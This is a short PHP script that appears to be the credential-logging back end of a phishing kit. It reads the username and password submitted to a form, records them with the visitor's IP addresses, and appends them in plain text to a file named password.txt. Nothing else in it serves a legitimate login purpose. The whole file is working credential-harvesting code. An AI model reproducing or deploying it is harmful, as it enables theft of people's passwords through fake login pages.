
<?php
function get_client_ip() {
    $ipaddress = '';
    if (isset($_SERVER['HTTP_CLIENT_IP']))
        $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
    else if(isset($_SERVER['HTTP_X_FORWARDED_FOR']))
        $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
    else if(isset($_SERVER['HTTP_X_FORWARDED']))
        $ipaddress = $_SERVER['HTTP_X_FORWARDED'];
    else if(isset($_SERVER['HTTP_FORWARDED_FOR']))
        $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
    else if(isset($_SERVER['HTTP_FORWARDED']))
        $ipaddress = $_SERVER['HTTP_FORWARDED'];
    else if(isset($_SERVER['REMOTE_ADDR']))
        $ipaddress = $_SERVER['REMOTE_ADDR'];
    else
        $ipaddress = 'UNKNOWN';
    return $ipaddress;
}
	$filename = "password.txt";
    $x1=$_SERVER['REMOTE_ADDR'];
    $x2= get_client_ip();
	// Open the file to get existing content
		$current = file_get_contents($filename);
	// Append a new person to the file
		$current .= $_POST["uname"]." - ".$_POST["password"]. " - [".$x1. "]". "- [".$x2."]". "\n";
	// Write the contents back to the file
        file_put_contents($filename, $current);
        //print($x1 ."<br>". $x2);

?>
